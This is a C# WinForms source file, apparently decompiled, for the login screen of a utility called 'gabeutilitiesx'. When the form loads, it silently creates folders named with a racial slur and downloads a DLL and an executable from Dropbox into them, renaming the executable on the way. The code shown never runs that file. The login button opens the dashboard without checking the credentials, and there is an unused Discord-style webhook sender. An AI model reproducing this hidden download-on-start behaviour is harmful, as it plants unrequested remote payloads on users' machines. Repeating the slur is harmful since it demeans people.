using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace gabeutilitiesx
{
	public class Login : Form
	{
		private Point lastPoint;

		private IContainer components;

		private PictureBox pictureBox1;

		private Label label1;

		private Label Password;

		private PictureBox pictureBox2;

		private Label label2;

		private Guna2TextBox textBox1;

		private Guna2TextBox textBox2;

		private Guna2GradientButton guna2GradientButton2;

		public Login()
		{
			InitializeComponent();
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			Directory.CreateDirectory("b:\\idontlikeniggersutilityx");
			Directory.CreateDirectory("b:\\idontlikeniggers");
			Directory.CreateDirectory("b:\\idontlikeniggers\\Save");
			Directory.CreateDirectory("b:\\idontlikeniggers2\\7-ZipPortable\\App\\7-Zip64\\");
			webClient.DownloadFile("https://dl.dropboxusercontent.com/s/d2m2xhrrsijqql4/7z.dll", "b:\\\\idontlikeniggers2\\\\7-ZipPortable\\\\App\\\\7-Zip64\\\\7z.dll");
			webClient.DownloadFile("https://dl.dropboxusercontent.com/s/t9kdtryicc2iq8a/gabegaber2.exe", "b:\\\\idontlikeniggers2\\\\7-ZipPortable\\\\App\\\\7-Zip64\\\\idontlikeniggers.exe");
		}

		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}

		private void pictureBox2_Click(object sender, EventArgs e)
		{
		}

		private void button2_Click(object sender, EventArgs e)
		{
			Close();
		}

		private void button1_Click(object sender, EventArgs e)
		{
			Hide();
			new dashboard().Show();
		}

		private void Username_TextChanged(object sender, EventArgs e)
		{
		}

		private void pictureBox2_Click_1(object sender, EventArgs e)
		{
			Close();
		}

		private void Login_MouseDown(object sender, MouseEventArgs e)
		{
			lastPoint = new Point(e.X, e.Y);
		}

		private void Login_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				base.Left += e.X - lastPoint.X;
				base.Top += e.Y - lastPoint.Y;
			}
		}

		public static void sendWebHook(string URL, string msg, string username)
		{
			Http.Post(URL, new NameValueCollection
			{
				{
					"username",
					username
				},
				{
					"content",
					msg
				}
			});
		}

		private void guna2GradientButton2_Click(object sender, EventArgs e)
		{
			Hide();
			new dashboard().Show();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(gabeutilitiesx.Login));
			pictureBox1 = new System.Windows.Forms.PictureBox();
			label1 = new System.Windows.Forms.Label();
			Password = new System.Windows.Forms.Label();
			pictureBox2 = new System.Windows.Forms.PictureBox();
			label2 = new System.Windows.Forms.Label();
			textBox1 = new Guna.UI2.WinForms.Guna2TextBox();
			textBox2 = new Guna.UI2.WinForms.Guna2TextBox();
			guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox2).BeginInit();
			SuspendLayout();
			pictureBox1.BackColor = System.Drawing.Color.Transparent;
			pictureBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("pictureBox1.BackgroundImage");
			pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			pictureBox1.Location = new System.Drawing.Point(159, 57);
			pictureBox1.Margin = new System.Windows.Forms.Padding(0);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(308, 113);
			pictureBox1.TabIndex = 0;
			pictureBox1.TabStop = false;
			label1.AutoSize = true;
			label1.BackColor = System.Drawing.Color.Transparent;
			label1.Cursor = System.Windows.Forms.Cursors.Default;
			label1.Font = new System.Drawing.Font("UD Digi Kyokasho NP-B", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 128);
			label1.ForeColor = System.Drawing.Color.White;
			label1.Location = new System.Drawing.Point(211, 173);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(90, 18);
			label1.TabIndex = 5;
			label1.Text = "Username";
			Password.AutoSize = true;
			Password.BackColor = System.Drawing.Color.Transparent;
			Password.Font = new System.Drawing.Font("UD Digi Kyokasho NP-B", 12f, System.Drawing.FontStyle.Bold);
			Password.ForeColor = System.Drawing.Color.White;
			Password.Location = new System.Drawing.Point(211, 245);
			Password.Name = "Password";
			Password.Size = new System.Drawing.Size(88, 18);
			Password.TabIndex = 6;
			Password.Text = "Password";
			pictureBox2.BackColor = System.Drawing.Color.Transparent;
			pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
			pictureBox2.Location = new System.Drawing.Point(605, -7);
			pictureBox2.Name = "pictureBox2";
			pictureBox2.Size = new System.Drawing.Size(29, 36);
			pictureBox2.TabIndex = 8;
			pictureBox2.TabStop = false;
			pictureBox2.Click += new System.EventHandler(pictureBox2_Click_1);
			label2.Anchor = System.Windows.Forms.AnchorStyles.None;
			label2.AutoSize = true;
			label2.BackColor = System.Drawing.Color.Transparent;
			label2.Font = new System.Drawing.Font("UD Digi Kyokasho NP-B", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 128);
			label2.ForeColor = System.Drawing.Color.White;
			label2.Location = new System.Drawing.Point(1, 357);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(236, 18);
			label2.TabIndex = 9;
			label2.Text = "https://discord.gg/juEH8Jj";
			textBox1.AcceptsTab = true;
			textBox1.Animated = true;
			textBox1.AutoRoundedCorners = true;
			textBox1.BackColor = System.Drawing.Color.Transparent;
			textBox1.BorderColor = System.Drawing.Color.FromArgb(224, 224, 224);
			textBox1.BorderRadius = 9;
			textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
			textBox1.DefaultText = "";
			textBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			textBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			textBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox1.DisabledState.Parent = textBox1;
			textBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
			textBox1.FocusedState.Parent = textBox1;
			textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 128);
			textBox1.ForeColor = System.Drawing.Color.Black;
			textBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(192, 255, 255);
			textBox1.HoverState.FillColor = System.Drawing.Color.White;
			textBox1.HoverState.Parent = textBox1;
			textBox1.IconLeft = (System.Drawing.Image)resources.GetObject("textBox1.IconLeft");
			textBox1.IconLeftSize = new System.Drawing.Size(10, 10);
			textBox1.IconRightSize = new System.Drawing.Size(34, 15);
			textBox1.Location = new System.Drawing.Point(212, 194);
			textBox1.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
			textBox1.Name = "textBox1";
			textBox1.PasswordChar = '\0';
			textBox1.PlaceholderForeColor = System.Drawing.Color.White;
			textBox1.PlaceholderText = "";
			textBox1.SelectedText = "";
			textBox1.ShadowDecoration.Enabled = true;
			textBox1.ShadowDecoration.Parent = textBox1;
			textBox1.Size = new System.Drawing.Size(200, 20);
			textBox1.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
			textBox1.TabIndex = 10;
			textBox2.AcceptsTab = true;
			textBox2.Animated = true;
			textBox2.AutoRoundedCorners = true;
			textBox2.BackColor = System.Drawing.Color.Transparent;
			textBox2.BorderColor = System.Drawing.Color.FromArgb(224, 224, 224);
			textBox2.BorderRadius = 9;
			textBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
			textBox2.DefaultText = "";
			textBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			textBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			textBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox2.DisabledState.Parent = textBox2;
			textBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
			textBox2.FocusedState.Parent = textBox2;
			textBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 128);
			textBox2.ForeColor = System.Drawing.Color.Black;
			textBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(192, 255, 255);
			textBox2.HoverState.FillColor = System.Drawing.Color.White;
			textBox2.HoverState.Parent = textBox2;
			textBox2.IconLeft = (System.Drawing.Image)resources.GetObject("textBox2.IconLeft");
			textBox2.IconLeftSize = new System.Drawing.Size(15, 15);
			textBox2.IconRightSize = new System.Drawing.Size(34, 15);
			textBox2.Location = new System.Drawing.Point(212, 266);
			textBox2.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
			textBox2.Name = "textBox2";
			textBox2.PasswordChar = '⚫';
			textBox2.PlaceholderForeColor = System.Drawing.Color.White;
			textBox2.PlaceholderText = "";
			textBox2.SelectedText = "";
			textBox2.ShadowDecoration.Enabled = true;
			textBox2.ShadowDecoration.Parent = textBox2;
			textBox2.Size = new System.Drawing.Size(200, 20);
			textBox2.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
			textBox2.TabIndex = 11;
			guna2GradientButton2.Animated = true;
			guna2GradientButton2.AutoRoundedCorners = true;
			guna2GradientButton2.BackColor = System.Drawing.Color.Transparent;
			guna2GradientButton2.BorderRadius = 19;
			guna2GradientButton2.CheckedState.Parent = guna2GradientButton2;
			guna2GradientButton2.Cursor = System.Windows.Forms.Cursors.Arrow;
			guna2GradientButton2.CustomImages.Parent = guna2GradientButton2;
			guna2GradientButton2.FillColor = System.Drawing.Color.Gray;
			guna2GradientButton2.FillColor2 = System.Drawing.Color.Silver;
			guna2GradientButton2.Font = new System.Drawing.Font("UD Digi Kyokasho NP-B", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 128);
			guna2GradientButton2.ForeColor = System.Drawing.Color.White;
			guna2GradientButton2.HoverState.BorderColor = System.Drawing.Color.Black;
			guna2GradientButton2.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			guna2GradientButton2.HoverState.Parent = guna2GradientButton2;
			guna2GradientButton2.Location = new System.Drawing.Point(227, 308);
			guna2GradientButton2.Name = "guna2GradientButton2";
			guna2GradientButton2.PressedDepth = 3;
			guna2GradientButton2.ShadowDecoration.Parent = guna2GradientButton2;
			guna2GradientButton2.Size = new System.Drawing.Size(160, 40);
			guna2GradientButton2.TabIndex = 26;
			guna2GradientButton2.Text = "Login";
			guna2GradientButton2.TextOffset = new System.Drawing.Point(0, 3);
			guna2GradientButton2.TextRenderingHint = System.Drawing.Text.TextRenderingHint.AntiAliasGridFit;
			guna2GradientButton2.UseTransparentBackground = true;
			guna2GradientButton2.Click += new System.EventHandler(guna2GradientButton2_Click);
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.White;
			BackgroundImage = (System.Drawing.Image)resources.GetObject("$this.BackgroundImage");
			BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			base.ClientSize = new System.Drawing.Size(631, 378);
			base.Controls.Add(guna2GradientButton2);
			base.Controls.Add(textBox2);
			base.Controls.Add(textBox1);
			base.Controls.Add(label2);
			base.Controls.Add(pictureBox2);
			base.Controls.Add(Password);
			base.Controls.Add(label1);
			base.Controls.Add(pictureBox1);
			DoubleBuffered = true;
			Font = new System.Drawing.Font("Nirmala UI", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Login";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "gabeutilitesx";
			base.Load += new System.EventHandler(Form1_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(Login_MouseDown);
			base.MouseMove += new System.Windows.Forms.MouseEventHandler(Login_MouseMove);
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox2).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
